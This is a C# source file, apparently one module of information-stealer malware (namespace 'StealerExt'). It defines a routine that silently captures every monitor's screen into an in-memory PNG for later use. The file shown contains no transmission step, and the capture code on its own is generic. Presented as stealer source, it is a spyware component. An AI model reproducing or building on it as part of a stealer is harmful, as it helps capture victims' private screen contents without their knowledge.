using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace StealerExt
{
    internal static class CurrentScreen
    {
        public static MemoryStream GetScreenshot()
        {
            int screenCount = Screen.AllScreens.Length;
            int screenTop = SystemInformation.VirtualScreen.Top;
            int screenLeft = SystemInformation.VirtualScreen.Left;
            int screenWidth = Screen.AllScreens.Max(x => x.Bounds.Width);
            int screenHeight = Screen.AllScreens.Max(x => x.Bounds.Height);
            bool isVertical = (SystemInformation.VirtualScreen.Height < SystemInformation.VirtualScreen.Width);
            if (isVertical)
                screenWidth *= screenCount;
            else
                screenHeight *= screenCount;
            MemoryStream fileStream = new MemoryStream();
            Bitmap bitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppArgb);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(screenLeft, screenTop, 0, 0, bitmap.Size);
            bitmap.Save(fileStream, ImageFormat.Png);
            return fileStream;
        }
    }
}